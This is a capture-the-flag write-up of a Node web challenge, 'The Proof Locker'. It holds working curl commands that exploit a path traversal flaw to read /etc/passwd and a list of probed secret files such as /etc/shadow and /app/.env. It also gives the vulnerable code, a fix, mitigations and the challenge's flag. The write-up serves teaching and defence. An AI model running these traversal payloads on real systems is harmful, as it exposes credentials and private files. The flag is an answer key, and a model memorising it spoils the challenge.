# The Proof Locker

> *Proof files live behind a tidy preview endpoint, but not every path stays
> where it belongs once the locker door is cracked open.*

**Category:** Web — path traversal → LFI
**Flag:** `bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}`

## The brief, in plain English

The "tidy preview endpoint" is `GET /api/reviews/proof?proof=<path>`. It's
meant to serve previews of uploaded proof files (the same files mentioned
in the review-submission allow-list from [The Proof Stamp](../09-the-proof-stamp/README.md)).
The `proof=` parameter is dropped into a server filesystem path without
sanitisation, so `..` segments escape the proof root and you can read
arbitrary files the Node process can `fs.readFile`.

The trick on top — the part that nearly made me miss the solve — is *where*
the flag lives. The LFI primitive only reliably surfaces one system file,
`/etc/passwd`. Most write-ups treat that as a sanity-check disclosure and
move on to `/etc/shadow` or `/app/.env`. This challenge stages the flag
inside `/etc/passwd` itself, as a synthetic user record. Read the whole
file.

## Recon

The endpoint shape is described in the listing-detail bundle:

```
GET /api/reviews/proof?proof=<filename>
```

A legitimate fetch returns the bytes of a file in the proof root:

```
proof=rat-builder/rat_screenshot.jpg → image content
```

Traversal works:

```bash
$ curl -s -b "$COOKIE" \
  'http://<host>/api/reviews/proof?proof=../../../../etc/passwd' \
  | head
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

Any non-empty path prefix collapses to `/etc/passwd`:

| Input | Resolves to |
|---|---|
| `etc/passwd` | `/etc/passwd` |
| `../etc/passwd` | `/etc/passwd` |
| `rat-builder/../etc/passwd` | `/etc/passwd` |
| `../../../../etc/passwd` | `/etc/passwd` |

All four return the same ~1024-byte file.

## The misdirection — almost everything else 404s

The first hour of this challenge I spent assuming "LFI on `/etc/passwd`" was
a stepping stone to "LFI on something interesting". I tried:

| Path | Result |
|---|---|
| `/etc/shadow` | 500 |
| `/etc/hostname` | 500 |
| `/proc/self/environ` | 500 |
| `/proc/1/environ` | 500 |
| `/app/.env` | 500 |
| `/app/package.json` | 500 |
| `/app/server.js` | 500 |
| `/app/.next/server/app/api/wanted-listings/route.js` | 500 |

Every single one returned `{"error":"Proof not found"}` or
`{"error":"Proof preview failed"}`. The proof handler has a narrow effective
allow-list — it'll happily serve `/etc/passwd` (and the proof root), and
nothing else I tried.

It looks like a dead-end LFI. It isn't — the LFI **is** the flag-fetcher,
because the flag is staged inside `/etc/passwd`.

## The flag is in `/etc/passwd`

Read the whole file, not just the first few entries:

```bash
$ curl -s -b "$COOKIE" \
  'http://<host>/api/reviews/proof?proof=../../../../etc/passwd' \
  | tail -1
opsflag:x:1337:1337:bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}:/nonexistent:/usr/sbin/nologin
```

The author created a synthetic user account:

- **Username:** `opsflag`
- **UID/GID:** 1337 (leet)
- **GECOS:** `bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}`
- **Home:** `/nonexistent`
- **Shell:** `/usr/sbin/nologin`

The GECOS field — historically the "full name and contact info" for the
user — is where the flag lives. A casual `head /etc/passwd` misses it; a
`grep bitflag` finds it instantly.

## Exploitation

```bash
COOKIE=$(curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}' -D - http://<host>/api/auth/login \
  | awk -F'[=;]' '/auth-token/{print "auth-token="$2}')

curl -s -b "$COOKIE" \
  'http://<host>/api/reviews/proof?proof=../../../../etc/passwd' \
  | grep -oE 'bitflag\{[^}]+\}'
# bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}
```

## Root cause

The proof handler concatenates the query parameter into a filesystem path
without normalising or constraining it:

```js
const proofRoot = "/app/proofs";
const target = path.join(proofRoot, req.query.proof);  // ← no realpath check
const bytes = await fs.readFile(target);
return new Response(bytes);
```

`path.join` collapses `..` segments — which is exactly what you don't want
here. The traversal lets the resolved path leave `/app/proofs` entirely and
land anywhere the process has read permission.

The right shape is:

```js
const proofRoot = "/app/proofs";
const requested = path.normalize(path.join(proofRoot, req.query.proof));
if (!requested.startsWith(proofRoot + path.sep)) {
  return Response.json({ error: "not allowed" }, { status: 400 });
}
const bytes = await fs.readFile(requested);
```

— *check the resolved path stays inside the root after normalisation*.

## Mitigation

- **After normalising the path, check it has the proof root as a prefix.**
  This is the canonical traversal-mitigation pattern. Anything more
  sophisticated than this is a wrapper around the same check.
- **Reject `..` segments at parse time.** A second defence layer — if you
  see a `..` in the input, just refuse it. Legitimate clients have no
  reason to send one.
- **Or — store proofs by id, not by filename.** Map user-facing identifiers
  to actual files in a database. The user never picks a filesystem path.

## Takeaways

- **The flag's payload is the lesson.** `pr00f_p4ths_5h0uld_st4y_1n_b0unds`
  is the one-line summary of the bug — proof paths should stay in bounds.
  Same self-naming pattern as `tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts` (web2)
  and `1nj3ct10n_turn5_4_l00kup_1nt0_4_l34k` (web3). The riffhack author is
  consistent about making the flag describe its own bug.
- **Misdirection through banality.** The handler refuses every "obvious"
  LFI target, so the solver concludes "it can only do `/etc/passwd`" and
  treats that as a dead end. The author staged the flag *inside* the
  boring file. Always grep the whole thing you just exfiltrated.
- **First LFI-class flag in the codebase.** Previous catalogued flags
  covered SSRF, JWT, SQLi, SSR-prop leaks, and IDORs; this one opens a
  new category. Worth noting for future challenges that might re-use the
  primitive.

## One-liner

```bash
curl -s -b "$COOKIE" \
  'http://<host>/api/reviews/proof?proof=../../../../etc/passwd' \
  | grep -oE 'bitflag\{[^}]+\}'
```
